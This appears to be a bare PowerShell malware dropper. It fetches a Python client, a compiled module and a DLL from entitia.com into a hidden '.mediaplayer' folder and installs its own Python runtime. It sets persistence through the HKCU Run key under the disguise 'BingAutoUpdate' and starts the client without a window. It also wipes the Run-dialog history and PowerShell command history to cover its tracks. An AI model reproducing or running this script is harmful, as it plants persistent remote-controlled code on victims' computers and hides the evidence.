# --- Set up environment 
$dir = "$env:localappdata\.mediaplayer"
$python = "$env:localappdata\Programs\Python";

Get-ChildItem -Path $dir -Recurse | Remove-Item -Force -Recurse

if (-not (Test-Path -Path $python)) {
  New-Item -Path $python -ItemType Directory
}

if (-not (Test-Path -Path $dir)) {
  New-Item -Path $dir -ItemType Directory
}


# --- Download required files
$url = "https://entitia.com/mp"

iwr "$url/api/static/client.pyw" -OutFile "$dir\client.pyw"
iwr "$url/api/static/module.pyd" -OutFile "$dir\mediaplayer.cp312-win_amd64.pyd"
iwr "$url/api/static/client.dll" -OutFile "$dir\core.dll"


# --- Install python if not installed
if (-not (Test-Path -Path "$python\Python312")) {
  iwr "$url/api/static/python.zip" -OutFile "$python\python.zip"
  Expand-Archive -Path "$python\python.zip" -DestinationPath $python
  Remove-Item -Path "$python\python.zip"
}


# --- Add file to autostart and start a python process
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "BingAutoUpdate" -Value "$python\Python312\pythonw.exe $dir\client.pyw" -Type String
Start-Process -FilePath "$python\Python312\pythonw.exe" -ArgumentList "$dir\client.pyw"


# --- Clean up
$MRU = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
if (Test-Path -Path $MRU) {
  Remove-Item -Path $MRU -Recurse
}

$PSReadLineHistory = "$env:appdata\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path -Path $PSReadLineHistory) {
  Remove-Item -Path $PSReadLineHistory
}
